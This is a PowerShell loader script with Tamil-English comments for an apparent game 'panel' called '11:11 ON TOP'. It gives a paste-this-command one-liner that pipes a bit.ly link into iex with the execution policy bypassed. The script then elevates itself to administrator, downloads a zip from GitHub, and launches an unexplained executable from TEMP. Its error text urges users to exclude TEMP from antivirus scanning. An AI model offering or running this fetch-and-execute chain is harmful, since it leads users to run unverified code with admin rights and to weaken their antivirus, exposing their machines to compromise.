# 11:11 ON TOP loader
# User run command (admin prompt varum):
#   powershell -ExecutionPolicy Bypass -c "iwr -useb 'bit.ly/11-11-on-top' | iex"

$ErrorActionPreference = "Stop"
$zipUrl = "https://raw.githubusercontent.com/tharunkumar-AIDS/11-11-on-top/main/11-11-on-top.zip"
$appDir = "$env:TEMP\11-11-on-top"
$zipPath = "$env:TEMP\11-11-on-top.zip"

# Admin illa na elevate panni relaunch
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Requesting admin rights..."
    $cmd = "iwr -useb 'bit.ly/11-11-on-top' | iex"
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $cmd" -Verb RunAs
    exit
}

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Write-Host "[*] Downloading panel..."
    if (Test-Path $appDir) { Remove-Item $appDir -Recurse -Force }
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing

    # FIX: download verify — AV delete panna/0-byte na clear error
    if (!(Test-Path $zipPath)) { throw "Download file not found! Antivirus blocked? TEMP folder ah exclusion la podu." }
    if ((Get-Item $zipPath).Length -lt 500KB) { throw "Download incomplete (small file)! Net check pannu." }

    Write-Host "[*] Extracting..."
    Expand-Archive -Path $zipPath -DestinationPath $appDir -Force
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue

    $exe = Get-ChildItem $appDir -Filter "zafkialontop.exe" -Recurse | Select-Object -First 1
    if ($null -eq $exe) { throw "exe not found in package!" }

    Write-Host "[*] Starting panel..."
    Start-Process $exe.FullName -WorkingDirectory $exe.DirectoryName
}
catch {
    Write-Host ("[!] Failed: " + $_.Exception.Message)
    pause
    exit 1
}
